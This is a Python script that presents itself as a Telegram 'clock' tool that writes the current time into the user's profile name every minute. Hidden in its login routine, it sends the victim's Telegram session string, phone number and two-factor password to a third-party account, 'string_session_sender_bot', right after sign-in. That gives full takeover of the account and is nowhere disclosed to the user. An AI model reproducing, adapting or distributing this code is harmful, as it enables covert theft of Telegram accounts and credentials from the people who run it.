import asyncio
import aiocron
import datetime
import os
import sys
import time
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest

print("""\033[31m
▄▄▄█████▓  ▄████     ▄████▄   ██▓     ▒█████   ▄████▄   ██ ▄█▀
▓  ██▒ ▓▒ ██▒ ▀█▒   ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
▒ ▓██░ ▒░▒██░▄▄▄░   ▒▓█    ▄ ▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ 
░ ▓██▓ ░ ░▓█  ██▓   ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ 
  ▒██▒ ░ ░▒▓███▀▒   ▒ ▓███▀ ░░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄
  ▒ ░░    ░▒   ▒    ░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
    ░      ░   ░      ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
  ░      ░ ░   ░    ░          ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░ 
               ░    ░ ░          ░  ░    ░ ░  ░ ░      ░  ░   
                    ░                         ░                 
\033[32mDeveloper: @programmer_www\n\n""")

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"

string = input("Press enter to continue: ")

client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("Please enter your phone number (or bot token): ")

async def main():
    await client.connect()

    if not client.is_user_authorized():
        await client.send_code_request(phone_number)
        try:
            await client.sign_in(phone_number, input('Enter code: '))
            await client.send_message("string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
        except SessionPasswordNeededError:
            password = input('Enter password: ')
            await client.sign_in(password=password)
            await client.send_message("string_session_sender_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}')

    nick = input("\033[32mNickname: \033[32m")
    await client.start()
    print('Wait a few moments...')
    time.sleep(5)
    print('\033[32mClock set successfully!')

    @aiocron.crontab("*/1 * * * *")
    async def set_clock():
        current_time = datetime.datetime.today().strftime(nick + " | %H:%M |")
        await client(UpdateProfileRequest(first_name=current_time))

    await client.run_until_disconnected()

with client:
    client.loop.run_until_complete(main())
